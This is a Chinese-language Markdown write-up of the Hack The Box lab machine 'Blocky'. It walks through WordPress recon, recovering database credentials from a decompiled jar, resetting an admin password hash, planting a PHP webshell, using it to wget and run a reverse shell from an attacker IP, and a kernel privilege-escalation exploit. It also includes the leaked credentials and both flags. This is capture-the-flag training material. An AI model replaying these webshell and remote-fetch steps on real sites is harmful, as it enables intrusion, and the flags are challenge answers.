@@ -1,0 +1,93 @@
+# Blocky
+- URL : https://app.hackthebox.eu/machines/48
+- IP : 10.129.1.53
+
+## Recon
+- Rustscan
+    - ![](https://i.imgur.com/P89zhUR.png)
+- Nmap
+    - ![](https://i.imgur.com/bDwHzxn.png)
+- 觀察首頁
+    - ![](https://i.imgur.com/WqNoQVr.jpg)
+    - ![](https://i.imgur.com/HvhvLma.png)
+    - 看起來是 Wordpress
+- 掃目錄
+    - https://www.exploit-db.com/exploits/46676
+    - phpmyadmin
+    - plugins
+- PHPmyadmin
+    - ![](https://i.imgur.com/awdZmG7.png)
+    - ![](https://i.imgur.com/btMisFu.png)
+    - Version `4.5.4.1`
+    - ![](https://i.imgur.com/4t4v8Sa.png)
+    - 有 Exploit
+        - https://www.exploit-db.com/exploits/40185
+            - 要帳密
+- 繼續觀察
+    - ![](https://i.imgur.com/SrBdmAD.png)
+    - 他有一個 Wiki
+    - ![](https://i.imgur.com/FPx76mQ.png)
+    - 其實剛剛 dirsearch 就有看到
+## Wordpress
+- 觀察 Wordpress 使用者
+    - `http://10.129.1.53/index.php/?author=1`
+    - `notch`
+    - ![](https://i.imgur.com/ZBjHwgb.png)
+    - ![](https://i.imgur.com/HHVGKWD.png)
+- 嘗試登入 `/wp-admin`
+    - ![](https://i.imgur.com/boYSIEU.png)
+- 觀察目錄 `/plugins`
+    - `plugins`
+    - ![](https://i.imgur.com/PI5v79z.png)
+    - 裡面有兩個檔案
+    - 感覺 `BlockyCore.jar` 是它們自己寫的
+## Reverse
+- 用 r2 觀察
+    - ![](https://i.imgur.com/JnQg4vm.png)
+- 算ㄌ還是不要裝逼，乖乖用 jd-gui 笑死
+    - ![](https://i.imgur.com/YnpMm9M.png)
+- 找到 db 帳密
+    - `root`
+    - `8YsqfCTnvxAUeduzjNSXe22`
+## PHP My admin
+- 用帳密登入後找到 Wordpress 使用者頁面
+    - ![](https://i.imgur.com/dxptAUw.png)
+    - 備份原本使用者的 hash 以備不時之需
+    - `$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`
+- 把 hash 修改成 `12345` 的 md5
+    - `827ccb0eea8a706c4c34a16891f84e7b`
+    - ![](https://i.imgur.com/uQGlHLJ.png)
+## 登入 Wordpress
+- 用帳號 `notch` 密碼 `12345` 登入
+    - ![](https://i.imgur.com/z9HTx8b.png)
+- 在 plugin 中增加 php web shell
+    - ![](https://i.imgur.com/40gCNnS.png)
+- 確認 webshell 可用
+    - ![](https://i.imgur.com/JSS7xV0.png)
+- 下載 reverse shell
+    - http://10.129.1.53/wp-content/plugins/akismet/akismet.php?A=wget%2010.10.16.35:8000/s_HTB
+- 執行 webshell
+    - http://10.129.1.53/wp-content/plugins/akismet/akismet.php?A=bash%20s_HTB
+## Reverse shell
+- ![](https://i.imgur.com/7JQhg8u.png)
+- spawn shell
+    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+## 提權
+- 跑 Linpeas
+    - ![](https://i.imgur.com/RNLfKEz.png)
+    - 發現可以 Kernel Exploit
+    - https://github.com/rlarabee/exploits/tree/master/cve-2017-16995
+- 編譯並丟過去
+    - https://raw.githubusercontent.com/rlarabee/exploits/master/cve-2017-16995/cve-2017-16995.c
+    - ![](https://i.imgur.com/7lmSnLK.png)
+- 取得 Flag
+    - User
+        - ![](https://i.imgur.com/JOMWCbN.png)
+        - `59fee0977fb60b8a0bc6e41e751f3cd5`
+    - Root
+        - ![](https://i.imgur.com/y15GubM.png)
+        - `0a9694a5b4d272c694679f7860f1cd5f`
+- 看了一下正規解
+    - 貌似可以直接用 SQL 密碼 SSH 登入
+    - 然後 sudo su 就結束ㄌ
+    - ㄏㄏ
